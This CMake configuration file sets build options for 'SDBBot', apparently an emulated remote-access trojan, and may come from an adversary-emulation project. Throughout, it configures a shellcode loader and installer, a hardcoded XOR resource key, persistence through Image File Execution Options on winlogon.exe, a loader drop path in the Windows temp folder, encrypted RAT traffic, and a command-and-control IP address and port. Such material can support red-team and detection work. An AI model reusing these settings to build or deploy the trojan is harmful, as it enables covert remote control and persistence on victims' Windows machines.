# Configuration options for SDBBot

# Configure stubbed dependencies for a given component. Can be overriden via
# cache variables set in CMakePresets.json
option(INSTALLER_STUB_LOADER "Use the stub loader when building the installer" OFF)
option(INSTALLER_STUB_SHELLCODE "Use the stub shellcode when building the installer" OFF)
option(LOADER_STUB_INSTALLER "Use the stub installer when building the loader" OFF)
option(LOADER_STUB_SHELLCODE "Use the stub shellcode when building the loader" OFF)
option(SHELLCODE_STUB_RAT "Use the stub RAT when building the shellcode" OFF)

# Resource XOR key
if (DEFINED ENV{RESOURCE_XOR_KEY_HEX})
    set(RESOURCE_XOR_KEY_HEX $ENV{RESOURCE_XOR_KEY_HEX})
else()
    set(RESOURCE_XOR_KEY_HEX "2aeb18b4d32e076a133132de579218a4c9e3bbdc4d18370cf7664754169ed82d7c6e839a6c28e2e7600b87e34f5e97a68272406985a916a34fec0e495f93821f756bb7bfde512d2c926786cb4740bec4c5022f84f093060457717104e1a80b94d2be43d174f41f7cb416ba87c45ff45080367cfa04dc53bfdc34717ec13f9cc4")
endif()

# Shellcode variables
if (DEFINED ENV{RAT_HOST_DLL})
    set(RAT_HOST_DLL $ENV{RAT_HOST_DLL})
else()
    set(RAT_HOST_DLL setupapi)
endif()

if (DEFINED ENV{RAT_HOST_DLL_EXPORT})
    set(RAT_HOST_DLL_EXPORT $ENV{RAT_HOST_DLL_EXPORT})
else()
    set(RAT_HOST_DLL_EXPORT SetupAddToSourceListW)
endif()

# Loader variables
if (NOT DEFINED LOADER_SHELLCODE_KEY)
    set(LOADER_SHELLCODE_KEY skw)
endif()

if (NOT DEFINED LOADER_SHELLCODE_VALUE)
    set(LOADER_SHELLCODE_VALUE d)
endif()

if (NOT DEFINED LOADER_SHELLCODE_DATA)
    set(LOADER_SHELLCODE_DATA 0xcc,0xc3) # int 3 breakpoint, return
endif()

# Installer variables
if (NOT DEFINED IFEO_TARGET_PROCESS)
    set(IFEO_TARGET_PROCESS winlogon.exe)
endif()

if (NOT DEFINED IFEO_FILTER_FULL_PATH)
    set(IFEO_FILTER_FULL_PATH C:\\\\Windows\\\\System32\\\\winlogon.exe)
endif()

if (NOT DEFINED LOADER_DROP_PATH)
    set(LOADER_DROP_PATH C:\\\\Windows\\\\temp\\\\tmp8AB2.tmp)
endif()

if (NOT DEFINED LOADER_SYMLINK)
    set(LOADER_SYMLINK msverload.dll)
endif()

# RAT variables
option(RAT_ENCRYPT_COMMS "Encrypt RAT comms" ON)

if (NOT DEFINED RAT_C2_IP_ADDRESS)
    set(RAT_C2_IP_ADDRESS 14.121.222.11)
endif()

if (NOT DEFINED RAT_C2_PORT)
    set(RAT_C2_PORT 443)
endif()

if (NOT DEFINED RAT_PACKET_HEADER)
    set(RAT_PACKET_HEADER 0x0000000F)
endif()
